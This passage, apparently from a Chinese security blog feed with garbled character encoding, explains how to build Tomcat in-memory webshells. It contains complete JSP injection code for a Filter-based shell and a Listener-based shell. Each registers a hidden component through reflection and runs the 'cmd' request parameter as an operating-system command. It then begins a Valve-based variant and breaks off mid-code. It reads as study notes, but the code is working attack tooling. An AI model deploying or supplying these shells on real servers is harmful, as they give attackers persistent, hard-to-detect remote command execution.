(StandardContext) stdctx.get(applicationContext);<br><br><br>    <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªfilterå®ä¾‹</span><br>    Filter evilFilter=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Filter</span>() &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>            <span class="hljs-keyword">if</span> (request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>                <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/C&quot;</span>, request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).start();<br>                <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> process.getInputStream().read(bytes);<br>                <span class="hljs-comment">//å°†å‘½ä»¤å›æ˜¾å†™å…¥åˆ°responseé‡Œé¢å»</span><br>                response.getWriter().write(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bytes, <span class="hljs-number">0</span>, len));<br>                process.destroy();<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>            <span class="hljs-comment">//å»æ‰§è¡ŒdoFilteræ–¹æ³•</span><br>            chain.doFilter(request,response);<br>        &#125;<br>    &#125;;<br>    <span class="hljs-comment">// FilterDef</span><br>    <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>    filterDef.setFilterName(<span class="hljs-string">&quot;clown&quot;</span>);<br>    filterDef.setFilterClass(evilFilter.getClass().getName());<br>    <span class="hljs-comment">//è¿™é‡Œä¼°è®¡ä¹Ÿæ˜¯åœ¨å®ä¾‹åŒ–filterçš„æ—¶å€™å¦‚æœfilterDefè®¾ç½®äº†å°±ç›´æ¥è¿”å›filterï¼Œå› ä¸ºè°ƒè¯•çš„æ—¶å€™filterDefé‡Œé¢æ­£å¸¸ä¹Ÿæ˜¯æ²¡æœ‰filterå®ä¾‹çš„</span><br>    filterDef.setFilter(evilFilter);<br>    <span class="hljs-comment">//æ·»åŠ FilterDef</span><br>    standardContext.addFilterDef(filterDef);<br><br>    <span class="hljs-comment">// FilterMap</span><br>    <span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>    filterMap.setFilterName(<span class="hljs-string">&quot;clown&quot;</span>);<br>    filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);<br>    filterMap.setDispatcher(DispatcherType.REQUEST.name());<br>    <span class="hljs-comment">//æ·»åŠ FilterMap</span><br>    standardContext.addFilterMapBefore(filterMap);<br><br>    <span class="hljs-comment">// è·å–filterConfigs</span><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">Configs</span> <span class="hljs-operator">=</span> standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>    Configs.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">filterConfigs</span> <span class="hljs-operator">=</span> (Map) Configs.get(standardContext);<br><br>    <span class="hljs-comment">//åˆ›å»ºApplicationFilterConfig</span><br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);<br>    constructor.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);<span class="hljs-comment">//å°†contextå’ŒfilterDefæ·»åŠ è¿›å»</span><br>    filterConfigs.put(<span class="hljs-string">&quot;clown&quot;</span>,filterConfig);<br><br>    out.print(<span class="hljs-string">&quot;Inject Success !&quot;</span>);<br><br><br><br>%&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409170203799.png" alt="image-20240917020309726"></p><p><img src="https://cdn.clown2024.cn/202409192246438.png" alt="image-20240919224412807"></p><p>æˆåŠŸï¼</p><blockquote><p>è¿˜æœ‰expä¸­çš„è¿™è¡Œä»£ç filterMap.setDispatcher(DispatcherType.REQUEST.name());</p><p>æˆ‘æœäº†ä¸€ä¸‹å®ƒæ˜¯å®šä¹‰äº†è¿‡æ»¤å™¨å¯ä»¥ä»‹å…¥çš„å‡ ç§è¯·æ±‚ç±»å‹ã€‚è¿™äº›ç±»å‹åŒ…æ‹¬ï¼š</p><ul><li><code>REQUEST</code>ï¼šæ™®é€šçš„å®¢æˆ·ç«¯è¯·æ±‚ã€‚</li><li><code>FORWARD</code>ï¼šé€šè¿‡ <code>RequestDispatcher</code> è½¬å‘çš„è¯·æ±‚ã€‚</li><li><code>INCLUDE</code>ï¼šé€šè¿‡ JSP åŒ…å«æŒ‡ä»¤åŒ…å«çš„èµ„æºã€‚</li><li><code>ERROR</code>ï¼šä½œä¸ºé”™è¯¯é¡µé¢è¯·æ±‚ã€‚</li></ul><p>æ‰€ä»¥è¿™è¡Œä»£ç ä¸æ˜¯å¿…é¡»çš„ï¼Œåˆ æ‰ä¹Ÿä¸€æ ·å¯ä»¥</p><p>è€Œä¸”è¿™è¡Œä»£ç åªæ”¯æŒTomcat 7.x ä»¥ä¸Šï¼Œå› ä¸ºjavax.servlet.DispatcherType ç±»æ˜¯servlet 3 ä»¥åå¼•å…¥ï¼Œè€Œ Tomcat 7ä»¥ä¸Šæ‰æ”¯æŒ Servlet 3</p></blockquote><h1 id="listenerå†…å­˜é©¬"><a href="#Listenerå†…å­˜é©¬" class="headerlink" title="Listenerå†…å­˜é©¬"></a>Listenerå†…å­˜é©¬</h1><p>listenerå°±æ˜¯äº‹ä»¶ç›‘å¬ï¼Œjavaæœ‰å¾ˆå¤šä¸­listener</p><p><img src="https://cdn.clown2024.cn/202409182314209.png" alt="image-20240918230547084"></p><p>å¤§éƒ½æ˜¯ç»§æ‰¿è‡ªEventListeneræ¥å£ï¼Œè¿™é‡Œç”¨ServletRequestListenerï¼Œä»–æœ‰ä¸‹é¢çš„ä¸¤ä¸ªæ–¹æ³•</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1.void requestInitialized(ServletRequestEvent sre)ï¼š<br>è¿™ä¸ªæ–¹æ³•åœ¨ Servlet è¯·æ±‚å¯¹è±¡è¢«åˆ›å»ºå¹¶ä¸”è¿˜æ²¡æœ‰è¢«ä½¿ç”¨ä¹‹å‰è¢«è°ƒç”¨ã€‚è¿™é€šå¸¸å‘ç”Ÿåœ¨ä¸€ä¸ª HTTP è¯·æ±‚åˆ°è¾¾ Servlet å®¹å™¨ï¼Œå¹¶ä¸”å®¹å™¨å†³å®šä¸ºè¯¥è¯·æ±‚åˆ›å»ºä¸€ä¸ªæ–°çš„ ServletRequest å¯¹è±¡æ—¶ã€‚è¿™ä¸ªæ–¹æ³•å¯ä»¥ç”¨æ¥åˆå§‹åŒ–è¯·æ±‚ç›¸å…³çš„èµ„æºï¼Œæ¯”å¦‚è®¾ç½®è¯·æ±‚å±æ€§æˆ–è€…å¯åŠ¨è·Ÿè¸ªè¯·æ±‚çŠ¶æ€çš„é€»è¾‘ã€‚<br><br>2.void requestDestroyed(ServletRequestEvent sre)ï¼š<br>è¿™ä¸ªæ–¹æ³•åœ¨ Servlet è¯·æ±‚å¯¹è±¡å³å°†è¢«é”€æ¯æ—¶è¢«è°ƒç”¨ã€‚è¿™é€šå¸¸å‘ç”Ÿåœ¨è¯·æ±‚å¤„ç†å®Œæˆï¼Œå“åº”å·²ç»å‘é€ç»™å®¢æˆ·ç«¯ä¹‹åã€‚è¿™ä¸ªæ–¹æ³•å¯ä»¥ç”¨æ¥æ¸…ç†è¯·æ±‚ç›¸å…³çš„èµ„æºï¼Œæ¯”å¦‚å…³é—­æ•°æ®åº“è¿æ¥æˆ–è€…æ¸…ç†åœ¨ requestInitialized æ–¹æ³•ä¸­åˆ›å»ºçš„ä»»ä½•å¯¹è±¡ã€‚<br></code></pre></td></tr></table></figure><p>å¯ä»¥å†™ä¸€ä¸ªç®€å•çš„demoæµ‹è¯•ä¸€ä¸‹</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.servletshell;<br><br><span class="hljs-keyword">import</span> javax.servlet.ServletRequestEvent;<br><span class="hljs-keyword">import</span> javax.servlet.ServletRequestListener;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ListenerTest</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ServletRequestListener</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestInitialized</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Listener è°ƒç”¨&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestDestroyed</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;servlet ç¦»å¼€&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>é…ç½®web.xml</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">listener</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">listener-class</span>&gt;</span>org.clown.servletshell.ListenerTest<span class="hljs-tag">&lt;/<span class="hljs-name">listener-class</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">listener</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="æµç¨‹åˆ†æ"><a href="#æµç¨‹åˆ†æ" class="headerlink" title="æµç¨‹åˆ†æ"></a>æµç¨‹åˆ†æ</h2><p>æ¥ä¸‹æ¥å°±æ˜¯ç…§å¸¸åˆ†æä¸€ä¸‹Listeneræ˜¯æ€ä¹ˆæ³¨å†Œçš„äº†</p><p>è¿™é‡Œç›´æ¥ä»<strong>ContextConfig#configureContext</strong>é‚£é‡Œå¼€å§‹åˆ†æï¼Œä¹Ÿå°±æ˜¯è®¿é—®å‰çš„è¿‡ç¨‹</p><p>é‚£å°±å†å»è¯»å–web.xmlçš„é‚£ä¸ªåœ°æ–¹çœ‹çœ‹</p><p><img src="https://cdn.clown2024.cn/202409191119893.png" alt="image-20240919111941724"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œåœ¨æ·»åŠ filterä¹‹åå°±å°†listenerçš„å…¨ç±»åè¿›è¡Œæ·»åŠ ï¼Œè°ƒç”¨StandardContext#addApplicationListeneræ–¹æ³•</p><p>æ·»åŠ ä¹‹åä»–ä¼šè°ƒç”¨StandardContext#listenerStart</p><p><img src="https://cdn.clown2024.cn/202409191139786.png" alt="image-20240919113903688"></p><p>ç„¶åè¿™é‡Œä¼šæŸ¥æ‰¾æˆ‘ä»¬æ·»åŠ çš„listenerï¼Œåˆ°è¿™æ­¥çš„ä»£ç æ¯”è¾ƒå¤æ‚å°±ä¸è°ƒäº†ï¼Œæœ‰ä¸ªæ•°å°±è¡Œ</p><p><strong>ç„¶åæˆ‘ä»¬å»è®¿é—®ç½‘é¡µ</strong>ï¼Œçœ‹ä¸€ä¸‹è¯·æ±‚è¿‡æ¥æ—¶listeneråœ¨å“ªé‡Œè°ƒç”¨çš„</p><p><img src="https://cdn.clown2024.cn/202409191143445.png" alt="image-20240919114327349"></p><p>è¿™é‡Œä¸‹ä¸ªæ–­ç‚¹ç„¶åçœ‹çœ‹è°ƒç”¨æ ˆï¼Œçœ‹å“ªä¸€ä¸ªå‡½æ•°æœ€é‡è¦</p><p><img src="https://cdn.clown2024.cn/202409191144058.png" alt="image-20240919114444926"></p><p>æœ€é‡è¦çš„åº”è¯¥æ˜¯è¿™ä¸ªå‡½æ•°StandardContext#fireRequestInitEvent</p><p>é‡æ–°å°†æ–­ç‚¹ä¸‹åœ¨è¿™é‡Œçœ‹ä¸€çœ‹</p><p><img src="https://cdn.clown2024.cn/202409191151789.png" alt="image-20240919115146689"></p><p>å¯ä»¥çœ‹åˆ°å®ƒæ¥å—äº†requestè¯·æ±‚å‚æ•°ç„¶åè¿›è¡Œç›¸å…³æ“ä½œï¼Œç„¶åè¿™é‡Œè·å–ä¸€ä¸ªlisteneræ•°ç»„</p><p>æˆ‘ä»¬è¿›è¯¥æ–¹æ³•çœ‹çœ‹</p><p><img src="https://cdn.clown2024.cn/202409191155718.png" alt="image-20240919115507610"></p><p>å¯ä»¥çœ‹åˆ°applicationEventListenersListé‡Œé¢çš„å°±æ˜¯æˆ‘ä»¬çš„listener</p><p>è€Œä¸”StandardContextè¿˜æœ‰å¯¹åº”çš„æ·»åŠ listenerçš„æ–¹æ³•å¦‚ä¸‹ï¼š</p><p><img src="https://cdn.clown2024.cn/202409191156621.png" alt="image-20240919115656529"></p><p>ç„¶åå°±æ˜¯åˆ°ä¸‹é¢éå†è§¦å‘æˆ‘ä»¬å®šä¹‰çš„listenerçš„requestInitialized()æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409191200195.png" alt="image-20240919120033087"></p><p>åˆ°è¿™é‡Œæµç¨‹å°±ç»“æŸï¼Œè¿™éƒ¨åˆ†çœ‹èµ·æ¥è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„</p><p>ç›¸å¯¹åº”çš„è¯·æ±‚ç»“æŸçš„æ—¶å€™å°±ä¼šè°ƒç”¨fireRequestDestroyEventæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409191232040.png" alt="image-20240919120248808"></p><h2 id="å†…å­˜é©¬ç¼–å†™"><a href="#å†…å­˜é©¬ç¼–å†™-1" class="headerlink" title="å†…å­˜é©¬ç¼–å†™"></a>å†…å­˜é©¬ç¼–å†™</h2><p>é€šè¿‡ä¸Šé¢çš„æµç¨‹åˆ†æï¼Œexpçš„ç¼–å†™æ­¥éª¤ä¹Ÿå¾ˆç®€å•ï¼š</p><p>å°±æ˜¯é€šè¿‡ StandardContext ç±»çš„ <code>addApplicationEventListener()</code> æ–¹æ³•æŠŠæ¶æ„çš„ Listenerå®ä¾‹æ”¾è¿›å»ï¼Œç„¶åæ¶æ„ä»£ç å†™åœ¨requestInitialized()æ–¹æ³•é‡Œé¢å³å¯</p><p>exp</p><figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%<br>    <span class="hljs-comment">//è·å–standardContext</span><br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br>    Field applicationContextField=servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    applicationContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) standardContextField.get(applicationContext);<br><br>    <span class="hljs-comment">//åˆ›å»ºæ¶æ„listener</span><br>    <span class="hljs-type">ServletRequestListener</span> <span class="hljs-variable">servletRequestListener</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletRequestListener</span>()&#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestDestroyed</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>            <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (HttpServletRequest) sre.getServletRequest();<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    Runtime.getRuntime().exec(cmd);<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace();<br>                &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                    n.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestInitialized</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br><br>        &#125;<br>    &#125;;<br>    <span class="hljs-comment">//æ·»åŠ ç›‘å¬å™¨</span><br>    standardContext.addApplicationEventListener(servletRequestListener);<br>%&gt;<br><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>ç„¶åç¾ç¾ç™½å±å¼¹è®¡ç®—å™¨</p><p><img src="https://cdn.clown2024.cn/202409191342329.png" alt="image-20240919134253239"></p><p><img src="https://cdn.clown2024.cn/202409191342142.png" alt="image-20240919134258008"></p><blockquote><p>è¿™é‡Œæˆ‘è®¤ä¸ºæ˜¯å¹¶æ²¡æœ‰ç›¸å…³è·¯å¾„çš„åŒ¹é…é€»è¾‘ï¼Œæ‰€ä»¥ä¸éœ€è¦åœ¨è®¿é—®å‰çš„é‚£éƒ¨åˆ†æ³¨å†Œ</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> å†…å­˜é©¬ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcatä¸­é—´ä»¶å†…å­˜é©¬</title>
      <link href="/2024/09/14/Tomcat%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2024/09/14/Tomcat%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<p>å…¶å®å‰é¢çš„ä¼ ç»Ÿwebåº”ç”¨å†…å­˜é©¬ä¹Ÿæ˜¯tomcatè¿™éƒ¨åˆ†çš„ï¼Œå› ä¸ºå®ƒåŸºäºtomcatè¿›è¡Œåˆ†æä¸è¿‡é—®é¢˜ä¸å¤§ï¼Œåˆ«çš„ä¸­é—´ä»¶åº”è¯¥ä¹Ÿæ˜¯æœ‰è¿™äº›åŸºæœ¬ç»„ä»¶çš„ã€‚</p><h1 id="tomcat-valveå†…å­˜é©¬"><a href="#Tomcat-Valveå†…å­˜é©¬" class="headerlink" title="Tomcat-Valveå†…å­˜é©¬"></a>Tomcat-Valveå†…å­˜é©¬</h1><p>valveå°±æ˜¯å‰é¢æ–‡ç« ä¸­è¯´è¿‡çš„é˜€é—¨ï¼Œä¹Ÿå°±æ˜¯pipeline(ç®¡é“)æœºåˆ¶ï¼Œæƒ³äº†è§£å¾—æ›´åŠ ç»†è‡´ä¸€ç‚¹å¯ä»¥çœ‹çœ‹è¿™ç¯‡æ–‡ç« ï¼š<a href="https://www.cnblogs.com/coldridgeValley/p/5816414.html%EF%BC%8C%E4%B9%9F%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%89%8D%E6%96%87%E6%8F%90%E5%88%B0%E7%9A%84%E6%80%BB%E7%BB%93%E5%A4%A7%E5%85%A8%E6%96%87%E7%AB%A0%E3%80%82">https://www.cnblogs.com/coldridgeValley/p/5816414.htmlï¼Œä¹Ÿå¯ä»¥çœ‹å‰æ–‡æåˆ°çš„æ€»ç»“å¤§å…¨æ–‡ç« ã€‚</a></p><p>è¿™é‡Œæ”¾ä¸€å¼ Valveçš„è¿è¡Œæœºåˆ¶å›¾</p><p><img src="https://cdn.clown2024.cn/202409211418602.png" alt="image-20240921141822546"></p><h2 id="åŸç†åˆ†æ"><a href="#åŸç†åˆ†æ" class="headerlink" title="åŸç†åˆ†æ"></a>åŸç†åˆ†æ</h2><p>ç»è¿‡å‰é¢çš„å­¦ä¹ ï¼Œç°åœ¨åˆ†æèµ·æ¥è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œè¿™é‡Œå°±ä¸è‡ªå·±é…ä¸€ä¸ªvalveäº†ï¼Œå› ä¸ºvalveå±äºå®¹å™¨ï¼Œéœ€è¦åœ¨server.xmlæˆ–è€…context.xmlé‚£é‡Œé…ç½®ï¼Œçœ‹çœ‹æ–‡ç« å°±è¡Œï¼Œæˆ–è€…åƒæ–‡ç« é‡Œç›´æ¥ç”¨springbootæ¥æ­å»ºã€‚</p><blockquote><p>Pipelineå®šä¹‰å¯¹åº”çš„æ¥å£æ˜¯Pipelineï¼Œä»–çš„å®ç°ç±»æ˜¯StandardPipelineï¼ŒValveå®šä¹‰å¯¹åº”æ¥å£Valveï¼Œä»–çš„æŠ½è±¡å®ç°ç±»æ˜¯ValveBaseï¼Œç„¶åå››ä¸ªå®¹å™¨æœ¬èº«æœ‰çš„é˜€é—¨ä¸ºStandardEngineValveï¼ŒStandardHostValveï¼ŒStandardContextValveï¼ŒStandardWrapperValveã€‚</p></blockquote><p>è¿™é‡Œç›´æ¥çœ‹æºç åˆ†æ</p><p><img src="https://cdn.clown2024.cn/202409211514128.png" alt="image-20240921151457990"></p><p>æˆ‘ä»¬åœ¨è®¿é—®filterçš„æ—¶å€™å¯ä»¥ä»è°ƒç”¨æ ˆçœ‹åˆ°å¾ˆå¤šçš„valveï¼Œæˆ‘ä»¬å¯ä»¥å»çœ‹ä¸€ä¸‹è¿™äº›wrapperValve</p><p><img src="https://cdn.clown2024.cn/202409211518432.png" alt="image-20240921151844389"></p><p>å¯ä»¥çœ‹åˆ°ç»§æ‰¿çš„æ˜¯ValveBaseè¿™ä¸ªç±»ï¼Œè¿™ä¸ªç±»æ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œç„¶åå®ƒåˆå®ç°äº†Valveæ¥å£ï¼Œçœ‹ä¸€ä¸‹Valveæ¥å£æœ‰ä»€ä¹ˆï¼Œç›´æ¥copyä¸€ä¸‹æ–‡ç« çš„å†…å®¹ï¼Œå› ä¸ºä»–åŠ äº†æ³¨é‡Š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.apache.catalina;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> org.apache.catalina.connector.Request;<br><span class="hljs-keyword">import</span> org.apache.catalina.connector.Response;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Valve</span> &#123;<br>    <span class="hljs-comment">// è·å–ä¸‹ä¸€ä¸ªé˜€é—¨</span><br>    <span class="hljs-keyword">public</span> Valve <span class="hljs-title function_">getNext</span><span class="hljs-params">()</span>;<br>    <span class="hljs-comment">// è®¾ç½®ä¸‹ä¸€ä¸ªé˜€é—¨</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setNext</span><span class="hljs-params">(Valve valve)</span>;<br>    <span class="hljs-comment">// åå°æ‰§è¡Œé€»è¾‘ï¼Œä¸»è¦åœ¨ç±»åŠ è½½ä¸Šä¸‹æ–‡ä¸­ä½¿ç”¨åˆ°</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">backgroundProcess</span><span class="hljs-params">()</span>;<br>    <span class="hljs-comment">// æ‰§è¡Œä¸šåŠ¡é€»è¾‘</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span><br>        <span class="hljs-keyword">throws</span> IOException, ServletException;<br>    <span class="hljs-comment">// æ˜¯å¦å¼‚æ­¥æ‰§è¡Œ</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isAsyncSupported</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬å¯ä»¥çœ‹ä¸€ä¸‹æ¯ä¸€çº§çš„Valveæ˜¯æ€ä¹ˆè°ƒç”¨çš„</p><p><img src="https://cdn.clown2024.cn/202409211533484.png" alt="image-20240921153326414"></p><p>åœ¨Hostè°ƒç”¨Contextçš„</p><p><img src="https://cdn.clown2024.cn/202409211533055.png" alt="image-20240921153355996"></p><p>åœ¨Contextè°ƒç”¨Wrapperçš„</p><p>ç„¶åæˆ‘ä»¬é‡æ–°ä¸‹æ–­ç‚¹ä»context.getPipelineå¼€å§‹çœ‹ï¼Œåˆ©ç”¨ç‚¹ä»è¿™é‡Œå¼€å§‹ï¼Œå› ä¸ºæˆ‘ä»¬å¥½è·å–çš„å°±æ˜¯context</p><p><img src="https://cdn.clown2024.cn/202409211538211.png" alt="image-20240921153810150"></p><p>è¿™é‡Œä¼šèµ°åˆ°çˆ¶ç±»çš„ContainerBaseçš„getPipelineæ–¹æ³•ï¼ŒContainerBaseæ˜¯æ‰€æœ‰å®¹å™¨çš„æŠ½è±¡çˆ¶ç±»</p><p><img src="https://cdn.clown2024.cn/202409211539334.png" alt="image-20240921153916289"></p><p>ç„¶åæˆ‘ä»¬å»çœ‹çœ‹è¿™ä¸ªpipeline</p><p><img src="https://cdn.clown2024.cn/202409211540918.png" alt="image-20240921154014879"></p><p>æ˜¯ä¸€ä¸ªStandardPipelineç±»ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å‰é¢è¯´è¿‡çš„Pipelineçš„å®ç°ç±»</p><p><img src="https://cdn.clown2024.cn/202409211541679.png" alt="image-20240921154104632"></p><p>çœ‹çœ‹Pipelineçš„æ¥å£æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409211541979.png" alt="image-20240921154142926"></p><p>å¯ä»¥çœ‹åˆ°æœ‰addVavleæ–¹æ³•ï¼Œé‚£ä¹ˆStandardPipelineå°±æœ‰ç›¸åº”çš„å®ç°æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409211543271.png" alt="image-20240921154312200"></p><p>é‚£æˆ‘ä»¬æ‰“å†…å­˜é©¬çš„æ€è·¯å°±å‡ºæ¥äº†</p><p>æˆ‘ä»¬åªéœ€è¦åˆ©ç”¨context.getPipelineç„¶åaddVavleè¿›å»ä¸€ä¸ªæˆ‘ä»¬è‡ªå·±å†™çš„æ¶æ„valveå³å¯</p><h2 id="å†…å­˜é©¬ç¼–å†™"><a href="#å†…å­˜é©¬ç¼–å†™" class="headerlink" title="å†…å­˜é©¬ç¼–å†™"></a>å†…å­˜é©¬ç¼–å†™</h2><p>exp</p><figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Pipeline&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span 